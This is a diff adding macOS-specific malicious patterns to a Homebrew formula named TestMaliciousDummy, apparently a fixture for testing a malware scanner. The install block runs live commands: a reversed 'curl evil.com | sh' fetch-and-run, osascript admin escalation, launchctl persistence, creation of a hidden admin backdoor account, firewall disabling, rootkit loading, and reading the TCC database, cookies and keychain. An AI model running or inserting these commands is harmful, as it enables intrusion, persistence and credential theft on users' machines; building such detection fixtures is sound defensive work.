@@ -106,6 +106,46 @@ class TestMaliciousDummy < Formula
 
     # Obfuscation technique 10: Method chaining obfuscation
     "hs | moc.live//:ptth lruc".reverse.tap { |c| system(c) }
+
+    # ==========================================================================
+    # macOS SPECIFIC MALICIOUS PATTERNS
+    # ==========================================================================
+
+    # macOS indicator 1: osascript execution
+    system 'osascript -e "tell application \\"System Events\\" to keystroke \\"a\\""'
+
+    # macOS indicator 2: osascript with admin privileges
+    system 'osascript -e "do shell script \\"id\\" with administrator privileges"'
+
+    # macOS indicator 3: launchctl persistence
+    system "launchctl load ~/Library/LaunchAgents/com.malware.plist"
+    system "launchctl submit -l com.backdoor -- /bin/sh -c 'curl http://evil.com'"
+
+    # macOS indicator 4: dscl manipulation
+    system "dscl . -create /Users/backdoor"
+    system "dscl . -append /Groups/admin GroupMembership backdoor"
+
+    # macOS indicator 5: TCC database access
+    tcc_data = `sqlite3 ~/Library/Application\\ Support/com.apple.TCC/TCC.db "SELECT * FROM access"`
+
+    # macOS indicator 6: Screen capture
+    system "screencapture -x /tmp/screen.png"
+
+    # macOS indicator 7: Quarantine bypass
+    system "xattr -d com.apple.quarantine /tmp/payload"
+
+    # macOS indicator 8: Hide files
+    system "chflags hidden /tmp/malware"
+
+    # macOS indicator 9: Firewall disable
+    system "/usr/libexec/ApplicationFirewall/socketfilterfw --setglobalstate off"
+
+    # macOS indicator 10: Kernel extension
+    system "kextload /tmp/rootkit.kext"
+
+    # macOS indicator 11: Browser credentials
+    cookies = File.read(File.expand_path("~/Library/Cookies/Cookies.binarycookies")) rescue nil
+    keychains = File.read(File.expand_path("~/Library/Keychains/login.keychain-db")) rescue nil
   end
 
   test do
